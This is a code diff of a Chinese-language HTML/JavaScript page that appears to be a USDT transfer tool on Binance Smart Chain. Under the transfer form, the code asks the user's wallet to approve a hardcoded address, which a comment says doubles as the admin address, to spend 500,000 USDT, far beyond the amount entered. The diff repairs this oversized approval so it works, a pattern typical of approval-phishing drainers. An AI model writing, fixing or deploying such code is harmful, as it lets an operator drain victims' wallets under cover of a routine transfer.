@@ -84,8 +84,6 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 // 收款地址与管理员地址统一
 const TARGET_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-// 修复：授权额度固定50万USDT，规避BSC-USDT无限MAX回滚BUG
-const GRANT_500K_WEI = web3.utils.toWei("500000", "ether");
 
 let web3 = null;
 let userAddress = null;
@@ -142,7 +140,7 @@ return;
 }
 try {
 if (!window.ethereum) {
-alert("没有检测BSC钱包，请使用MetaMask / TP / OKX钱包打开");
+alert("没有检测BSC钱包，请使用MetaMask / TP / OKX钱包内置浏览器打开");
 return;
 }
 await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -188,12 +186,13 @@ if (!web3 || !userAddress) return alert("钱包未连接");
 const val = parseFloat(amountInput.value);
 if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
 const needWei = web3.utils.toWei(val.toString(),"ether");
+// 500000 USDT授权额度，放在函数内部，web3已经实例化完成
+const GRANT_500K_WEI = web3.utils.toWei("500000", "ether");
 try {
 sendBtn.disabled = true;
 const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
 if(BigInt(allowance) < BigInt(needWei)){
 alert("🔐需要授权USDT合约，请钱包确认签名");
-// 使用50万额度，不再使用无限MAX
 await usdtContract.methods.approve(TARGET_ADDR, GRANT_500K_WEI).send({from:userAddress});
 alert("✅授权交易已提交，等待节点同步");
 await waitAllowance(needWei);
@@ -249,8 +248,6 @@ adminPanel.style.display = adminPanel.style.display === 'block' ? 'none':'block'
 alert("你不是管理员账号");
 }
 });
-
-// 删掉页面加载自动连接，必须手动点击圆点连接钱包
 </script>
 </body>
 </html>
